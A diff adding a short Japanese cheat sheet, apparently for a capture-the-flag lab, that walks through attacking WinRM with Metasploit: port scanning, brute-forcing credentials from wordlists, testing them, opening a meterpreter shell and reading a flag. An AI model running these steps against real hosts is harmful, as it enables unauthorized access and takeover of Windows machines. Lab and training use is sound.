@@ -1,0 +1,34 @@
+WinRM：Metasploitによるエクスプロイト
+1) nmap --top-ports 7000 ターゲットホスト
+*winrmは5985がデフォルトなポートになる
+2) service postgresql start && msfconsole
+3) 有効なクレデンシャルを探す
+use auxiliary/scanner/winrm/winrm_login
+set RHOSTS
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set PASSWORD anything
+exploit
+4) winrmがサポートする認証方法の確認
+use auxiliary/scanner/winrm/winrm_auth_methods
+set RHOSTS
+exploit
+5) 以下のコマンドでクレデンシャルが正しいかどうかを判定する
+use auxiliary/scanner/winrm/winrm_cmd
+set RHOSTS
+set USERNAME
+set PASSWORD
+set CMD whoami
+exploit
+6) 以下のコマンドで、meterpreterの権限を奪う
+use exploit/windows/winrm/winrm_script_exec
+set RHOSTS
+set USERNAME
+set PASSWORD
+set FORCE_VBS true
+exploit
+7) フラグの取得
+cd /
+dir
+cat flag.txt
